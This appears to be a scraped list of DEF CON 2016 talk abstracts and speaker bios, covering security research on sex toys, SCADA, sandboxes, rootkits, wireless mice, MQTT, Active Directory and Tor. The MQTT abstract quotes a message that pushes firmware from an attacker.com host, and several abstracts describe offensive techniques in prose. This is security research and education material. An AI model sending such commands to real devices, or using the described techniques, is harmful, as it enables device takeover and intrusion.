<p class="abstract">The Internet of Things is filled with vulnerabilities, would you expect the Internet of Vibrating Things to be any different? As teledildonics come into the mainstream, human sexual pleasure has become connected with the concerns of privacy and security already familiar to those who previously only wanted to turn on their lights, rather than their lover. Do you care if someone else knows if you or your lover is wearing a remote control vibrator? Do you care if the manufacturer is tracking your activity, sexual health and to whom you give control? How do you really know who is making you squirm with pleasure? And what happens when your government decides your sex toy is an aid to political dissidents? Because there’s nothing more sexy than reverse engineering we looked into one product (the We-Vibe 4 Plus from the innocuously named "Standard Innovation Corporation") to get answers for you.<br><br> Attend our talk to learn the unexpected political and legal implications of internet connected sex toys and, perhaps more importantly, how you can explore and gain more control over the intimate devices in your life. Learn the reverse engineering approach we took--suitable for both first timers and the more experienced--to analyze a product that integrates a Bluetooth LE/Smart wireless hardware device, mobile app and server-side functionality. More parts means more attack surfaces! Alongside the talk, we are releasing the "Weevil" suite of tools to enable you to simulate and control We-Vibe compatible vibrators. We invite you to bring your knowledge of mobile app exploits, wireless communication hijacking (you already hacked your electronic skateboard last year, right?) and back-end server vulnerabilities to the party. It’s time for you to get to play with your toys more privately and creatively than before. <br><br>Please note: This talk contains content related to human sexuality but does not contain sexually explicit material.

<p class="abstract">Over the last year, synchronized and coordinated attacks against critical infrastructure have taken center stage. Remote cyber intrusions at three Ukrainian regional electric power distribution companies in December 2015 left approximately 225,000 customers without power. Malware, like BlackEnergy, is being specially developed to target supervisory control and data acquisition (SCADA) systems. Specifically, adversaries are focusing their efforts on obtaining access to the human-machine interface (HMI) solutions that act as the main hub for managing the operation of the control system. Vulnerabilities in these SCADA HMI solutions are, and will continue to be, highly valuable as we usher in this new era of software exploitation. This talk covers an in-depth analysis performed on a corpus of 200+ confirmed SCADA HMI vulnerabilities. It details out the popular vulnerability types discovered in HMI solutions developed by the biggest SCADA vendors, including Schneider Electric, Siemens, General Electric, and Advantech. It studies the weaknesses in the technologies used to develop HMI solutions and describes how critical vulnerabilities manifest in the underlying code. The talk will compare the time-to-patch performance of various SCADA vendors along with a comparison of the SCADA industry to the rest of the software industry. Finally, using the data presented, additional guidance will be provided to SCADA researchers along with a prediction on what we expect next in attacks that leverage SCADA HMI vulnerabilities.</p>

<p class="abstract">At DEF CON 16 in 2008, we released the original BSODomizer (www.bsodomizer.com), an open source VGA pranking tool and introductory hacking platform for the multicore Propeller micro-controller. Hours of productivity were replaced with rage and frustration as unwitting computer users were confronted with fake Blue Screens of Death and revolting ASCII art. But, the world has changed. The machines have risen in capability. HDMI is the graphical transmission protocol of choice and hacking with micro-controllers is standard issue. The as-seen-on-HDTV duo of Joe Grand and Zoz return with the next generation of mischievous hardware, a device that supplants or captures any inline HDMI signal in a discreet, pentest-worthy package. BSODomizer HD is an FPGA-based system that not only improves on the graphics interception and triggering features of its predecessor, but can now capture screenshots of a target system and also provides a fully open design that you can use for your own experiments into the mystical world of massive, customizable arrays of digital logic. We'll guide you through the process of going from lamer zero to hacker hero with FPGAs, while savagely fucking with a few unfortunate friends along the way! </p>

<h2 class="talkTitle">Slouching Towards Utopia: The State of the Internet Dream</h2>
<h3 class="speaker">Jennifer S. Granick <span class="speakerTitle">Director of Civil Liberties, Stanford Center for Internet and Society</span></h3>

<p class="abstract">Is the Internet going to live up to its promise as the greatest force for individual freedom that the world has ever known? Or is the hope for a global community of creative intellectual interaction lost…for now?<br><br> In last year’s Black Hat keynote—entitled "Lifecycle of a Revolution"—noted privacy and civil liberties advocate Jennifer Granick told the story of the Internet utopians, people who believed that Internet technology could greatly enhance creative and intellectual freedom. Granick argued that this Dream of Internet Freedom was dying, choked off by market and government forces of centralization, regulation, and globalization. The speech was extremely popular. Almost 8000 people watched it at Black Hat. It was retweeted, watched and read by tens of thousands of people. Boing Boing called it "the speech that won Black Hat (and DEF CON )."<br><br> This year, Granick revisits the state of the Internet Dream. This year’s crypto war developments in the U.S. and U.K. show governments’ efforts to control the design of technologies to ensure surveillance. The developments also show that governments see app stores as a choke point for regulation and control, something that couldn’t easily happen with general purpose computers and laptops but which could be quite effective in a world where most people access the network with mobile devices.<br><br> Also in the past year, the European Court of Justice embraced blocking orders and ISP liability in the name of stopping copyright infringement, privacy violations, and unflattering comments from ever being published online. The effect of these developments is to force Internet companies to be global censors on the side of online civility against the free flow of information and opinion. If we want to realize some of the promise of the Internet utopian vision, we are going to have to make some hard political choices and redesign communications technology accordingly. The future could look a lot like TV, or we could work to ensure our technology enshrines individual liberties. This talk will help attendees join that effort.</p>

<p class="speakerBio">In 1995, <strong>Jennifer Granick</strong> attended her first DEF CON at the Tropicana Hotel. Since then, she has defended hackers and coders in computer crime, copyright, DMCA and other cases.

<h3 class="speaker">Marco Grassi <span class="speakerTitle">KEENLAB of Tencent</span><br>
Qidan He <span class="speakerTitle">KEENLAB of Tencent</span></h3>

<p class="abstract">The main topic of this technical talk will be "sandboxes" and how to escape them. One of the main component of the modern operating systems security is their sandbox implementation. Android for example in recent versions added SELinux to their existing sandbox mechanism, to add an additional layer of security. As well OS X recently added System Integrity Protection as a &lsquo;system level&rsquo; sandbox, in addition to the regular sandbox which is &lsquo;per-process&rsquo;.<br><br> All modern OS focus on defense in depth, so an attacker and a defender must know these mechanisms, to bypass them or make them more secure. We will focus on Android and iOS/OSX to show the audience the implementations of the sandbox in these operating systems, the attack surface from within interesting sandboxes, like the browser, or applications sandbox.<br><br> Then we will discuss how to attack them and escape from our restricted context to compromise further the system, showcasing vulnerabilities. We think that comparing Android with iOS/OSX can be very interesting since their implementation is different, but the goal for attackers and defenders is the same, so having knowledge of different sandboxes is very insightful to highlight the limitations of a particular implementation. The sandboxes some years ago were related mainly to our desktop, mobile phone or tablet. But if we look now at the technology trend, with Automotive and IOT, we can understand that sandboxes will be crucial in all those technologies, since they will run on mainstream operating system when they will become more popular.</p>

<h3 class="speaker">Jay Healey <span class="speakerTitle">Senior Research Scholar, Columbia University</span></h3>

<p class="abstract">Does the FBI have to tell Apple of the vuln it used to break their iPhone?  How many 0days every year go into the NSA arsenal -- dozens, hundreds or thousands? Are there any grown-ups in Washington DC watching over FBI or NSA as they decide what vulns to disclose to vendors and which to keep to themselves?  These are all key questions which have dominated so much of 2016, yet there's been relatively little reliable information for us to go on, to learn what the Feds are up to and whether it passes any definition of reasonableness.<br><br>

Based on open-source research and interviews with many of the principal participants, this talk starts with the pre-history starting in the 1990s before examining the current process and players (as it turns out, NSA prefers to discover their own vulns, CIA prefers to buy). The current process is run from the White House with "a bias to disclose" driven by a decision by the President (in because of the Snowden revelations). The entire process was made public when NSA was forced to deny media reports that it had prior knowledge of Heartbleed.</p>

<h2 class="talkTitle">Developing Managed Code Rootkits for the Java Runtime Environment</h2>
<h3 class="speaker">Benjamin Holland <span class="speakerTitle">ISU Team, DARPA's Space/Time Analysis for Cybersecurity (STAC)</span></h3>

<p class="abstract">Managed Code Rootkits (MCRs) are terrifying post-exploitation attacks that open the doors for cementing and expanding a foothold in a target network. While the concept isn't new, practical tools for developing MCRs don't currently exist. Erez Metula released ReFrameworker in 2010 with the ability to inject attack modules into the C# runtime, paving the way for MCRs, but the tool requires the attacker to have knowledge of intermediate languages, does not support other runtimes, and is no longer maintained. Worse yet, the &lsquo;write once, run anywhere&rsquo; motto of managed languages is violated when dealing with runtime libraries, forcing the attacker to write new exploits for each target platform. <br><br>This talk debuts a free and open source tool called JReFrameworker aimed at solving the aforementioned challenges of developing attack code for the Java runtime while lowering the bar so that anyone with rudimentary knowledge of Java can develop a managed code rootkit. With Java being StackOverflow's most popular server side language of 2015 the Java runtime environment is a prime target for exploitation. JReFrameworker is an Eclipse plugin that allows an attacker to write simple Java source to develop, debug, and automatically modify the runtime. Best of all, working at the intended abstraction level of source code allows the attacker to &lsquo;write once, exploit anywhere&rsquo;. When the messy details of developing attack code are removed from the picture the attacker can let his creativity flow to develop some truly evil attacks, which is just what this talk aims to explore.</p>

<h3 class="speaker">Stephan Huber <span class="speakerTitle">Fraunhofer SIT</span><br>

</h3>

<p class="abstract">-Today’s evil often comes in the form of ransomware, keyloggers, or spyware, against which AntiVirus applications are usually an end user’s only means of protection. But current security apps not only scan for malware, they also aid end users by detecting malicious URLs, scams or phishing attacks.<br><br> Generally, security apps appear so self-evidently useful that institutions such as online-banking providers even require users to install anti-virus programs. In this talk, however, we show that the installation of security applications, at least in the context of smartphones, can sometimes open the phone to a number of attack vectors, making the system more instead of less vulnerable to attacks. <br><br>In a recent research we conducted on Android security apps from renowned vendors such as Kaspersky, McAfee, Androhelm, Eset, Malwarebytes or Avira. When conducting a study of the apps’ security features (Antivirus and Privacy Protection, Device Protection, Secure Web Browsing, etc.) it came as a shock to us that every inspected application contained critical vulnerabilities, and that in the end no single of the promoted security features proved to be sufficiently secure. In a simple case, we would have been able to harm the app vendor’s business model by upgrading a trial version into a premium one at no charge. <br><br>In other instances, attackers would be able to harm the end user by completely disabling the malware-scanning engine remotely. Or how about accessing confidential data by exploiting broken SSL communication, broken self-developed "advanced" crypto implementations or through SQL-injections?<br><br> Yes, we can. On top, we were able to bypass the secure browsing protection and abuse it for code execution. The most alarming findings, however, were security applications that we were able to actually turn into a remote access trojan (RAT) or into ransomware. In light of all those findings, one must seriously question whether the advice to install a security app onto one’s smartphone is a wise one. In this talk, we will not only explain our findings in detail but also propose possible security fixes.</p>

<h3 class="speaker">Przemek Jaroszewski <span class="speakerTitle">CERT Polska/NASK</span></h3>

<p class="abstract">While traveling through airports, we usually don't give a second thought about why our boarding passes are scanned at various places. After all, it's all for the sake of passengers' security. Or is it? The fact that boarding pass security is broken has been proven many times by researchers who easily crafted their passes, effectively bypassing not just &lsquo;passenger only&rsquo; screening, but also no-fly lists. Since then, not only security problems have not been solved, but boarding passes have become almost entirely bar-coded. And they are increasingly often checked by machines rather than humans. Effectively, we're dealing with simple unencrypted strings of characters containing all the information needed to decide on our eligibility for fast lane access, duty-free shopping, and more... <br><br>With a set of easily available tools, boarding pass hacking is easier than ever, and the checks are mostly a security theater. In my talk, I will discuss in depth how the boarding pass information is created, encoded and validated. I will demonstrate how easy it is to craft own boarding pass that works perfectly at most checkpoints (and explain why it doesn't work at other ones). <br><br>I will also discuss IATA recommendations, security measures implemented in boarding passes (such as digital signatures) and their (in)effectiveness, as well as responses I got from different institutions involved in handling boarding passes. There will be some fun, as well as some serious questions that I don't necessarily have good answers to. </p>

<p class="abstract">The number of IMSI-catchers (rogue cell towers) has been steadily increasing in use by hackers and governments around the world. Rogue cell towers, which can be as small as your home router, pose a large security risk to anyone with a phone. If in range, your phone will automatically connect to the rogue tower with no indication to you that anything has happened. At that point, your information passes through the rogue tower and can leak sensitive information about you and your device. Currently, there are no easy ways to protect your phone from connecting to a rogue tower (aside from some Android apps which are phone specific and require root access). In this talk I'll demonstrate how you can create a rogue cell tower detector using generic hardware available from Amazon. The detector can identify rogue towers and triangulate their location. The demonstration uses a software defined radio (SDR) to fingerprint each cell tower and determine the signal strength of each tower relative to the detector. With a handful of these detectors working together, you can identify when a rogue cell tower enters your airspace, as well as identify the signal strength relative to each detector. This makes it possible to triangulate the source of the new rogue cell tower.</p>

<h3 class="speaker">K2 <span class="speakerTitle">Director, IOACTIVE</span></h3>

<p class="abstract">What's your style of hooking? My hooking Style? It's like hooking without hookers.<br><br>

The use cases for hooking code execution are abundant and this topic is very expansive.  EhTracing (pronounced ATracing) is technique that allows monitoring/altering of code execution at a high rate with several distinct advantages. </p>
<ul class="talkList">
<li>Full context (registers, stack &amp; system state) hooking can be logged without needing to know a function prototype and changes to execution flow can be made as desired.
<li>Traditional detours like hooking requires a length disassembly engine than direct binary .text segment modifications to insert an intended hook (no changes to binary needed with EhTrace).
<li>Block/Branch stepping enables a simplification of analysis code (does not need to do a full procedure/function graph recognition/traversal).  This will feature focus on the use of VEH and the DR7 backdoor in x64 Windows.

<p class="abstract">In a nutshell, EhTrace enables very good performance, in proc debugging and a dead simple RoP hook primitive.  Some neat graphics and visualizations will be made some of the early examples up at https://github.com/K2/EhTrace<br><br>
 
This novel implementation for hookers establishes a model for small purpose built block-fighting primitives to be used in order to analyze &amp; do battle, code vs. code. <br><br>
 
As a special bonus "round 3 FIGHT!" we will see a hypervisor DoS that will cause a total lockup for most hypervisors (100%+ utilization per CORE). This goes to show that emulating or even adapting a hypervisor to a full CPU feature set is exceedingly hard and it’s unlikely that a sandbox/hypervisor/emulator will be a comprehensive solution to evade detection from adversarial code for some time.<br><br>
 
Let’s have some fun blockfighting with some loose boxed hookers!</p>

<p class="abstract">Secure Channel (Schannel) is Microsoft's standard SSL/TLS Library underpinning services like RDP, Outlook, Internet Explorer, Windows Update, SQL Server, LDAPS, Skype and many third party applications. Schannel has been the subject of scrutiny in the past several years from an external perspective due to reported vulnerabilities, including a RCE. <br><br>What about the internals? How does Schannel guard its secrets? This talk looks at how Schannel leverages Microsoft's CryptoAPI-NG (CNG) to cache the master keys, session keys, private and ephemeral keys, and session tickets used in TLS/SSL connections. It discusses the underlying data structures, and how to extract both the keys and other useful information that provides forensic context about connection. This information is then leveraged to decrypt session that use ephemeral cipher suites, which don't rely on the private key for decryption. Information in the cache lives for at least 10 hours by default on modern configurations, storing up to 20,000 entries for client and server each. This makes it forensically relevant in cases where other evidence of connection may have dissipated.</p>

The trouble with VNC is that it was invented 15+ years ago and hasn't been improved upon in any significant way. Besides the internet of things being sprinkled with VNC endpoints, there are companies which use VNC to such a large degree they need a VNC proxy on their perimeter to get to all the internal VNC hosts - some of which are ICS/SCADA devices. Stargate is the result of discovering a vulnerability in these VNC proxies that allows you to proxy basically anything. This allows you to do anything from using them as anonymous proxies, conduct reflective scanning, pivoting into the internal network behind it, and more. In this presentation we will show you exactly what Stargate is, how we encountered it, the 'fun' things you can do with the Stargates all around the globe and we will release the Stargate tool which anyone can use to talk to/through these devices.</p>

<h2 class="talkTitle">101 Sentient Storage - Do SSDs Have a Mind of Their Own? </h2>
<h3 class="speaker">Tom Kopchak <span class="speakerTitle">Director of Technical Operations, Hurricane Labs</span></h3>

<p class="abstract">Solid state drives drives are fundamentally changing the landscape of the digital forensics industry, primarily due to the manner in which they respond to the deletion of files. Previous research has demonstrated that SSDs do not always behave in an equivalent manner to magnetic hard drives, however, the scope of these differences and the conditions that lead to this behavior are still not well understood. This basic, undeniable anomaly regarding file storage and recovery begs one simple, yet critical question: can the data being mined for evidence be trusted?<br><br> This talk presents research on the forensic implications of SSDs from one of the most comprehensive studies to date. The goal of this study was to demonstrate and quantify differences across a sample pool of drives in an array of tests conducted in a controlled environment. These tests explored the variations between drive firmware, controllers, interfaces, operating systems, and TRIM state. <br><br>Further observations revealed that some drives behaved nearly identical to the control drive, while others showed that the prospects of recovering deleted data was significantly reduced. This presentation will demonstrate these differences and provide a framework to allow forensics investigators to determine the likelihood of successful deleted file recovery from an evidence bearing solid state drive.</p>

<h2 class="talkTitle">'Cyber' Who Done It?! Attribution Analysis Through Arrest History </h2>
<h3 class="speaker">Jake Kouns <span class="speakerTitle">CISO, Risk Based Security</span></h3>

<p class="abstract">There have been over 20,000 data breaches disclosed exposing over 4.8 billion records, with over 4,000 breaches in 2015 alone. It is clear there is no slowdown at all and the state of security is embarrassing. The total cybercrime cost estimates have been astronomical and law enforcement has been struggling to track down even a fraction of the criminals, as usual. <br><br>Attribution in computer compromises continues to be a surprisingly complex task that ultimately isn’t definitive in most cases. Rather than focusing on learning from security issues and how companies can avoid these sorts of data breaches in the future, for most media outlets the main topic after a breach continues to be attribution. And if we are honest, the media have painted an "interesting" and varied picture of "hackers" over the years, many of which have caused collective groans or outright rage from the community. <br><br>The Arrest Tracker project was started in 2011 as a way to track arrests from all types of "cyber" (drink!) and hacking related incidents. This project aims to track computer intrusion incidents resulting in an arrest, detaining of a person or persons, seizure of goods, or other related activities that are directly linked to computer crimes. <br><br>The Arrest Tracker project currently has 936 arrests collected as of 4/23/2016. How does tracking this information help and what does the data tell us? A lot actually! Who is behind these data breaches and what are the demographics such as average age, gender, and nationality? Which day of the week are you most likely to be arrested? How many arrests lead to assisting authorities to arrest others? How many work by themselves versus part of a group? These observations, and a lot more, paint an interesting picture of the computer crime landscape.</p>

<h3 class="speaker">Ricky &lsquo;HeadlessZeke&rsquo; Lawshae<span class="speakerTitle">Hacker</span></h3>

<p class="abstract">With the rise of the Internet of Things, the line between the physical and the digital is growing ever more hazy. Devices that once only existed in the tangible world are now accessible by anyone with a network connection. Even physical security systems, a significant part of any large organization’s overall security posture, are being given network interfaces to make management and access more convenient. But that convenience also significantly increases the risk of attack, and hacks that were once thought to only exist in movies, like opening a building’s doors from a laptop or modifying a camera feed live, are now possible and even easy to pull off. In this talk, we will discuss this new attack surface and demonstrate various ways an attacker can circumvent and compromise devices such as door controllers, security cameras, and motion sensors over the network, as well as ways to protect yourself from such attacks.</p>

</h3>

<p class="abstract">To improve road safety and driving experiences, autonomous vehicles have emerged recently, and they can sense their surroundings and navigate without human inputs. Although promising and proving safety features, the trustworthiness of these cars has to be examined before they can be widely adopted on the road. Unlike traditional network security, autonomous vehicles rely heavily on their sensory ability of their surroundings to make driving decision, which opens a new security risk. Thus, in this talk we examine the security of the sensors of autonomous vehicles, and investigate the trustworthiness of the 'eyes' of the cars. In this talk, we investigate sensors whose measurements are used to guide driving, i.e., millimeter-wave radars, ultrasonic sensors, forward-looking cameras. In particular, we present contactless attacks on these sensors and show our results collected both in the lab and outdoors on a Tesla Model S automobile. We show that using off-the-shelf hardware, we are able to perform jamming and spoofing attacks, which caused the Tesla's blindness and malfunction, all of which could potentially lead to crashes and greatly impair the safety of self-driving cars. To alleviate the issues, at the end of the talk we propose software and hardware countermeasures that will improve sensor resilience against these attacks.</p>

<p class="speakerBio"><strong>Jianhao Liu</strong> is the director of ADLAB at Qihoo 360. He specializes in the security of Internet of Things and Internet of Vehicles. He has reported a security vulnerability of Tesla Model S, led a security research on the remote control of a BYD car, and participated in the drafting of security standards among the automobile society. Being a security expert employed by various information security organizations and companies, he is well experienced in security service, security evaluation, and penetration test.<br><br>

<strong>Chen Yan</strong> is a PhD student at Zhejiang University in the Ubiquitous System Security Laboratory. His research focuses on the security and privacy of wireless communication and embedded systems, including automobile, analog sensors, and IoT devices.<br><br>

<p class="abstract">A number of toolsets have been around for a while which propose methods for identifying vulnerabilities in kernels, in particular POSIX kernels. However, none of these identified a method for generic fuzzing across Windows and POSIX kernels and have not been updated for some time.<br><br>

This presentation will outline the research which has occurred in order to find exploitable bugs across both Windows and POSIX kernels, focusing on fuzzing system calls and library calls in the Windows environment. System calls will be briefly explained, how they work and how these can be fuzzed in order to find bugs. The presentation will then move on to explaining core libraries in the Windows environment and how to fuzz these effectively.<br><br>

Other issues with creating a kernel fuzzing environment will be discussed, such as effective logging of calls in which the machine could BSOD and kernel panic, and how to correctly reproduce vulnerabilities that have been identified by the fuzzer.

Neal Hindocha <span class="speakerTitle">Principal Consultant, FortConsult (Part of NCC Group)</span></h3>

<p class="abstract">The presentation will begin by discussing the protocol (http://mqtt.org/) and results from a simple query on shodan, showing the number of servers directly available on the internet. We will then go through the protocol specifications which shows that security is more or less non-existent. We are able to directly connect to many of the servers which are open to the internet, and following protocol specifications, see what devices they are communicating with.<br><br>

We will show how its possible to extract data on all subscriptions available on the server using a ruby script, which basically gives a detailed list of the devices. However, it is not only the list of devices we are getting. The data returned by our script also contains things like session tokens (for web pages), social security numbers, phone numbers, names and other sensitive data used for one purpose or another in the communication to and from the devices. <br><br>

We will show how messages can be posted into the message queues and in turn received by the devices that subscribe to the various queues. This means that we are able to issue commands targeting the range of devices we have discovered, that use this protocol. We have however also discovered that this is not limited to messages and commands, if supported by the device, we can actually issue firmware updated, simply by sending something similar to "FIRMWAREUPDATEHERE:http://www.attacker.com/filename.bin".<br><br>

A specific example of what we can see and do is a home automation system we discovered. We got a list of every sensor and its status. Furthermore, we got exact GPS coordinates from the mobile app used to control the home automation. So in this case, not only were we able to control the system, we even knew when the owner was away.<br><br>

The talk will move on to show various implementations where webclients and SQL servers are hooked in. Much of the communication data is stored in various databases, and because we have access, we can use MQTT to attack the database and web servers. <br><br>

Multiple tools have been developed by us already to support testing the protocol and fuzzing endpoints. we will show the tools used in various demos and release them at the end of the talk! These tools are currently scripts containing various protocol implementations, that can be used to target servers and extract, or inject, data.  We also have a small client that implements all interesting areas of the protocol which we use for server-to-client testing.<br><br>

We believe this talk is going to have a significant impact on MQTT and anyone who uses it. This is an old protocol from 1999. Its fast and reliable, but its missing security.  <br><br>

We also be believe this talk will trigger a discussion about light-weight IoT protocols and security, which is much needed at this point in time.</p>

<h2 class="talkTitle">Secure Penetration Testing Operations: Demonstrated Weaknesses in Learning Material and Tools</h2>
<h3 class="speaker">Wesley McGrew <span class="speakerTitle">Director of Cyber Operations, HORNE Cyber</span></h3>


<p class="abstract">Following previous presentations on the dangers penetration testers face in using current off-the-shelf tools and practices (Pwn the Pwn Plug and I Hunt Penetration Testers), this third presentation explores how widely available learning materials used to train penetration testers lead to inadequate protection of client data and penetration testing operations. With widely available books and other training resources targeting the smallest set of prerequisites, in order to attract the largest audience, many penetration testers adopt the techniques used in simplified examples to real world tests, where the network environment can be much more dangerous. Malicious threat actors are incentivized to attack and compromise penetration testers, and given current practices, can do so easily and with dramatic impact.</p>

<p class="abstract">This presentation will include a live demonstration of techniques for hijacking a penetration tester's normal practices, as well as guidance for examining and securing your current testing procedures. Tools shown in this demonstration will be released along with the talk.</p>

<p class="speakerBio">Wesley currently oversees and participates in penetration testing in his role of Director of Cyber Operations for HORNE Cyber Solutions. He has presented on topics of penetration testing, vulnerabilities, and malware analysis at DEF CON  and Black Hat USA. He teaches a self-designed course on reverse engineering to students at Mississippi State University, using real-world, high-profile malware samples. Wesley graduated from Mississippi State University's Department of Computer Science and Engineering and previously worked at the Distributed Analytics and Security Institute. He holds a Ph.D. in computer science for his research in vulnerability analysis of SCADA HMI systems.<br><br>

<p class="abstract">Machines are getting smarter – so consumer protection enforcers like the Federal Trade Commission need to get smarter too. The FTC is the lead federal agency for protecting the privacy rights and data security of American consumers. In the last year, it brought several enforcement actions against companies for violating consumer privacy and data security and launched new initiatives – PrivacyCon, Start with Security, and a new Office of Technology Research and Investigation– to improve its capabilities and responsiveness to new threats to consumer privacy and security. But the FTC needs your help. Today it is announcing a call for research on specific topics in order to broaden its capabilities to protect consumers. Come learn about the policy responses to the rise of the machines, the FTC’s cases and research initiatives, and how you can help.</p>

<p class="speakerBio"><strong>Terrell McSweeny</strong> serves as a Commissioner of the Federal Trade Commission. This year marks her third time at DEF CON . When it comes to tech issues, Commissioner McSweeny has focused on the valuable role researchers and hackers can play protecting consumer data security and privacy. She opposes bad policy and legislative proposals like mandatory backdoors and the criminalization of hacking and believes that enforcers like the FTC should work with the researcher community to protect consumers. She wants companies to implement security by design, privacy by design and data ethics by design –but recognizes that, in the absence of regulation, enforcement and research are the only means of holding companies accountable for the choices they make in the ways that they hold and use consumer data.<br><br>

<h3 class="speaker">Salvador Mendoza <span class="speakerTitle">Student &amp; Researcher</span></h3>

<p class="abstract">Samsung announced many layers of security to its Pay app. Without storing or sharing any type of user's credit card information, Samsung Pay is trying to become one of the securest approaches offering functionality and simplicity for its customers.</p>

<p class="abstract">This app is a complex mechanism which has some limitations relating security. Using random tokenize numbers and implementing Magnetic Secure Transmission (MST) technology, which do not guarantee that every token generated with Samsung Pay would be applied to make a purchase with the same Samsung device. That means that an attacker could steal a token from a Samsung Pay device and use it without restrictions. </p>

<p class="abstract">Inconvenient but practical is that Samsung's users could utilize the app in airplane mode. This makes impossible for Samsung Pay to have a full control process of the tokens pile. Even when the tokens have their own restrictions, the tokenization process gets weaker after the app generates the first token relating a specific card.</p>

<p class="abstract">How random is a Spay tokenized number? It is really necessary to understand how the tokens heretically share similarities in the generation process, and how this affect the end users' security.</p>

<p class="abstract">What are the odds to guess the next tokenized number knowing the previous one?</p>

<p class="abstract">Active Directory (AD) is leveraged by 95% of the Fortune 1000 companies for its directory, authentication, and management capabilities, so why do red teams barely scratch the surface when it comes to leveraging the data it contains? This talk skips over the standard intro to Active Directory fluff and dives right into the compelling offensive information useful to a Red Teamer, such as quickly identifying target systems and accounts. AD can yield a wealth of information if you know the right questions to ask. This presentation ventures into areas many didn't know existed and leverages capability to quietly identify interesting accounts &amp; systems, identify organizations the target company does business with regularly, build target lists without making a sound, abuse misconfigurations/existing trusts, and quickly discover the most interesting shares and their location. PowerShell examples and AD defense evasion techniques are provided throughout the talk. <br><br>Let's go beyond the MCSE and take a different perspective on the standard AD recon and attack tactics.</p>

<p class="abstract">We've all worked on &lsquo;closed systems&rsquo; with little to no direct Internet access. And we've all struggled with the limitations those systems put on us in the form of available tools or software we want to use. I didn't like struggling, so I came up with a method to load whatever I wanted on to a closed system without triggering any common security alerts. To do this I had to avoid accessing the Internet or using mag media. In the end all I needed was an office multi-function machine and Excel. It's all any insider needs. <br><br>For my presentation and demo, I'll show you how I delivered a select group of PowerSploit tools to a clean, isolated machine. Of course, Excel has been known as vector for macro viruses for quite some time and some of the techniques--such as hex-encoding binary data and re-encoding it on a target machine--are known binary insertion vectors but I have not found any prior work on an insider using these techniques to deliver payloads to closed systems. You'll leave my presentation knowing why Excel, umm, excels as an insider attack tool, how to leverage Excel features to load and extract arbitrary binary data from a closed network, and what to do if this really frightens you.</p>

<h2 class="talkTitle">MouseJack: Injecting Keystrokes into Wireless Mice </h2>
<h3 class="speaker">Marc Newlin <span class="speakerTitle">Security Researcher, Bastille Networks</span></h3>

<p class="abstract">What if your wireless mouse was an effective attack vector? Research reveals this to be the case for mice from Logitech, Microsoft, Dell, Lenovo, Hewlett-Packard, Gigabyte, and Amazon. Dubbed 'MouseJack', this class of security vulnerabilities allows keystroke injection into non-Bluetooth wireless mice. Imagine you are catching up on some work at the airport, and you reach into your laptop bag to pull out your phone charger. As you glance back at your screen, you see the tail end of an ASCII art progress bar followed by your shell history getting cleared.<br><br> Before you realize what has happened, an attacker has already installed malware on your laptop. Or maybe they just exfiltrated a git repository and your SSH keys. In the time it took you to plug in your phone, you got MouseJacked. The attacker is camped out at the other end of the terminal, equipped with a commodity USB radio dongle and a directional patch antenna hidden in a backpack, and boards her plane as soon as the deed is done. The reality of MouseJack is that an attacker can inject keystrokes into your wireless mouse dongle from over 200 meters away, at a rate of up to 7500 keystrokes per minute (one every 8ms). <br><br>Most wireless keyboards encrypt the data going between the keyboard and computer in order to deter sniffing, but wireless mouse traffic is generally unencrypted. The result is that wireless mice and keyboards ship with USB dongles that can support both encrypted and unencrypted RF packets. A series of implementation flaws makes it possible for an attacker to inject keystrokes directly into a victim's USB dongle using easily accessible, cheap hardware, in most cases only requiring that the user has a wireless mouse. The majority of affected USB dongles are unpatchable, making it likely that vulnerable computers will be common in the wild for the foreseeable future. <br><br>This talk will explain the research process that lead to the discovery of these vulnerabilities, covering specific tools and techniques. Results of the research will be detailed, including protocol behavior, packet formats, and technical specifics of each vulnerability. Additional vulnerabilities affecting 14 vendors are currently in disclosure, and will be revealed during this talk.</p>

<p class="abstract">Tor is a widely used anonymity network that protects users' privacy and and identity from corporations, agencies and governments. However, Tor remains a practical system with a variety of limitations, some of which were indeed exploited in the recent past. In particular, Tor's security relies on the fact that a substantial number of its nodes do not misbehave. <br><br>Previous work showed the existence of malicious participating Tor relays. For example, there are some Exit nodes that actively interfere with users' traffic and carry out man-in-the-middle attacks. In this work we expose another category of misbehaving Tor relays (HSDirs), that are integral to the functioning of the hidden services and the dark web. The HSDirs act as the DNS directory for the dark web. Because of their nature, detecting their malicious intent and behavior is much harder. We introduce, the concept of honey onions (honions), a framework to detect misbehaving Tor relays with HSDir capability. By setting up and deploying a large scale honion over Tor for more than 72 days, we are able to obtain lower bounds on misbehavior among HSDirs. <br><br>We propose algorithms to both estimate the number of snooping HSDirs and identify them, using optimization and feasibility techniques. Our experimental results indicate that during the period of our work at least 110 such nodes were snooping information about hidden services they host. We reveal that more than half of them were hosted on cloud infrastructure and delayed the use of the learned information to prevent easy traceback. Furthermore, we provide the geolocation map of the identified snooping Tor HSDirs</p>

<h3 class="speaker">Radia Perlman <span class="speakerTitle">EMC Fellow</span></h3>

<p class="abstract">Often distributed systems are considered robust if one of the components halts. But a failure mode that is often neglected is when a component continues to operate, but incorrectly. This can happen due to malicious intentional compromise, or simple hardware faults, misconfiguration, or bugs. Unfortunately, there is no single add-on to designs that will fix this case. This talk presents three very different systems and how they each handle resilience despite malicious participants. The problems, and the solutions, are very different. The important message of this talk is that there is no one solution, and that this case must be considered in designs.</p>

By combining our concept of derivative admin (the chaining or linking of administrative rights), existing tools, and graph theory, we can reveal the hidden and unintended relationships in Active Directory domains. <br><br>Bob is an admin on Steve’s system, and Steve is an admin on Mary’s system; therefore, Bob is effectively (and perhaps unintentionally) an admin on Mary’s system. While existing tools such as Nmap, PowerView, CrackMapExec, and others can gather much of the information needed to find these paths, graph theory is the missing link that gives us the power to find hidden relationships in this offensive data. The application of graph theory to an Active Directory domain offers several advantages to attackers and defenders. Otherwise invisible, high-level organizational relationships are exposed. All possible escalation paths can be efficiently and swiftly identified. Simplified data aggregation accelerates blue and red team analysis. Graph theory has the power and the potential to dramatically change the way you think about and approach Active Directory domain security.</p>

<h3 class="speaker">Chris Rock <span class="speakerTitle">Founder and CEO, Kustodian</span></h3>

